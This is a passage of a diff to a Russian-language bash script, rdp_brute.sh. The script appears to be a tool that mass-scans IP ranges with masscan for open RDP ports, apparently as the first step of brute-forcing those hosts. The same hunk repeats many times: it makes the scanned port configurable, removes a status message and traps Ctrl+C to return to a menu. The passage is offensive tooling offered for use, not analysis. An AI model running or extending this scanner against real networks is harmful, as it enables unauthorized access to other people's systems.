 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6353,7 +6357,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6368,7 +6372,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6401,7 +6405,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6416,7 +6420,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6450,7 +6454,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6465,7 +6469,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6499,7 +6503,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6514,7 +6518,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6548,7 +6552,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6563,7 +6567,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6597,7 +6601,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6612,7 +6616,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6646,7 +6650,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6661,7 +6665,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6695,7 +6699,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6710,7 +6714,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6744,7 +6748,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6759,7 +6763,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6792,7 +6796,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6807,7 +6811,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6841,7 +6845,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6856,7 +6860,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6890,7 +6894,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6905,7 +6909,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6939,7 +6943,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6954,7 +6958,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6988,7 +6992,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7003,7 +7007,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7037,7 +7041,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7052,7 +7056,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7086,7 +7090,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7101,7 +7105,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7135,7 +7139,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7150,7 +7154,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7184,7 +7188,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7199,7 +7203,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7233,7 +7237,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7248,7 +7252,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7282,7 +7286,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7297,7 +7301,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7331,7 +7335,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7346,7 +7350,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7380,7 +7384,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7395,7 +7399,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7429,7 +7433,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7444,7 +7448,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7478,7 +7482,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7493,7 +7497,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7527,7 +7531,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7542,7 +7546,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7574,7 +7578,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7589,7 +7593,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7623,7 +7627,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7638,7 +7642,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7671,7 +7675,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7686,7 +7690,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7720,7 +7724,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7735,7 +7739,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7769,7 +7773,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7784,7 +7788,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7818,7 +7822,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7833,7 +7837,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7867,7 +7871,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7882,7 +7886,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7916,7 +7920,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7931,7 +7935,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -7965,7 +7969,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -7980,7 +7984,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8014,7 +8018,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8029,7 +8033,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8063,7 +8067,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8078,7 +8082,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8112,7 +8116,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8127,7 +8131,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8161,7 +8165,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8176,7 +8180,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8210,7 +8214,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8225,7 +8229,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8259,7 +8263,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8274,7 +8278,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8308,7 +8312,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8323,7 +8327,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8357,7 +8361,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8372,7 +8376,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8406,7 +8410,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -8421,7 +8425,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -8455,7 +8459,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
